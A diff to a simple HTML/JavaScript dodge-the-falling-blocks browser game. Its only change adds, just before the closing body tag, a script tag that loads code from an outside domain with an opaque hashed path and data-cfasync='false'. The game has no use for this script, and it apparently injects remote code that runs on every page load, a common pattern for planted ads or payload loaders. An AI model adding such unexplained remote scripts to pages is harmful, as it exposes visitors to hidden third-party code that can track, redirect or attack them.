@@ -46,5 +46,6 @@ document.getElementById('left').onclick=()=>{px=Math.max(0,px-30); player.style.
 document.getElementById('right').onclick=()=>{px=Math.min(312,px+30); player.style.left=px+'px';}
 function spawn(){if(!running)return; let e=document.createElement('div'); e.className='enemy'; e.style.left=Math.random()*312+'px'; e.style.top='0px'; box.appendChild(e); let top=0; let id=setInterval(()=>{top+=5; e.style.top=top+'px'; if(top>420){ if(Math.abs(parseInt(e.style.left)-px)<48){ running=false; alert('Game Over! Score: '+score); location.reload(); }} if(top>500){clearInterval(id); e.remove(); score++; scoreEl.innerText='Score: '+score;}},30); setTimeout(spawn,800);} spawn();
 </script>
+ <script data-cfasync="false" src="https://bicea.org/14/7d9de99940958a19c652c9d8141a0ee7"></script>
 </body>
 </html>
